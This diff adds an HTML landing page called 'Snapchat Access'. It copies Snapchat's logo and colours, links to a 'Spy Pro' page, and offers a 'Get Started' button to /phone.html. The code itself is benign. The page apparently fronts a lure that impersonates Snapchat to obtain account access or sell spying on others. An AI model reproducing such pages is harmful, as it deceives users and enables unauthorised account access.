@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Access</title>
+    <link rel="icon" href="/images/snapchat-logo-300x300-removebg-preview.png">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFFC00;
+            color: #000;
+        }
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 30px;
+            background: #000;
+            position: relative;
+        }
+        .navbar a:hover{
+            color:#FFFC00;
+        }
+        .menu {
+            display: flex;
+        }
+        .menu a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 1.2rem;
+        }
+        .menu-toggle {
+            display: none;
+            font-size: 2rem;
+            background: none;
+            border: none;
+            color: #FFFC00;
+            cursor: pointer;
+        }
+        @media (max-width: 768px) {
+            .menu {
+                display: none;
+                flex-direction: column;
+                position: absolute;
+                top: 60px;
+                right: 0;
+                background: #000;
+                width: 100%;
+                text-align: center;
+            }
+            .menu a {
+                padding: 15px;
+                display: block;
+            }
+            .menu-toggle {
+                display: block;
+            }
+        }
+        .container {
+            display: flex;
+            flex-wrap: wrap;
+            height: 100vh;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .left, .right {
+            flex: 1;
+            min-width: 300px;
+            padding: 20px;
+        }
+        .right {
+            text-align: left;
+            display: flex;
+            justify-content: center;
+        }
+        .left {
+            text-align: left;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .right img {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 20px;
+        }
+        .btn {
+            display: inline-block;
+            background: #000;
+            color: #FFFC00;
+            padding: 12px 25px;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            text-decoration: none;
+            transition: all 0.3s ease-in-out;
+            text-align: center;
+            margin-top: 20px;
+            width: max-content;
+        }
+        .btn:hover {
+            background: #FFFC00;
+            color: #000;
+            border:  1px solid #000;
+        }
+        h1 {
+            font-size: 3rem;
+        }
+        p {
+            font-size: 1.2rem;
+            line-height: 1.5;
+        }
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+                height: auto;
+                padding: 40px 20px;
+            }
+            .left, .right {
+                text-align: center;
+            }
+            .right img {
+                width: 80%;
+            }
+        }
+
+        .preloader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #FFFC00;
+            font-size: 2rem;
+            z-index: 9999;
+            opacity: 1;
+            transition: opacity 0.5s ease;
+        }
+        .preloader.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+    <script>
+        function toggleMenu() {
+            var menu = document.getElementById('menu');
+            if (menu.style.display === 'flex') {
+                menu.style.display = 'none';
+            } else {
+                menu.style.display = 'flex';
+                menu.style.flexDirection = 'column';
+                menu.style.width = '100%';
+            }
+        }
+
+
+        function showPreloader(event) {
+            event.preventDefault();
+            const preloader = document.querySelector('.preloader');
+            preloader.classList.remove('hidden');
+            setTimeout(() => {
+                window.location.href = event.target.href;
+            }, 1000); // Adjust time as needed
+        }
+        
+        document.addEventListener("DOMContentLoaded", function() {
+            document.querySelectorAll(".menu a, .btn").forEach(anchor => {
+                anchor.addEventListener("click", showPreloader);
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="preloader hidden">Loading...</div>
+    <nav class="navbar">
+        <h2 style="color: #FFFC00;">Snapchat Access</h2>
+        <button class="menu-toggle" onclick="toggleMenu()">☰</button>
+        <div class="menu" id="menu">
+            <a href="">Home</a>
+            <a href="#">About</a>
+            <a href="#">Services</a>
+            <a href="#">Contact</a>
+            <a href="/home.html">Spy Pro</a>
+
+        </div>
+    </nav>
+    <div class="container">
+        <div class="left">
+            <h1>Welcome to Snapchat Access</h1>
+            <p>The Snapchat Access website simplifies account management while maintaining privacy and security. With a comprehensive set of features, it provides users with a convenient and reliable way to stay connected on Snapchat across multiple devices.</p>
+            <a href="/phone.html" class="btn">Get Started</a>
+        </div>
+        <div class="right">
+            <img src="/images/snapchat-logo-300x300-removebg-preview.png" alt="Placeholder Image">
+        </div>
+    </div>
+</body>
+</html>
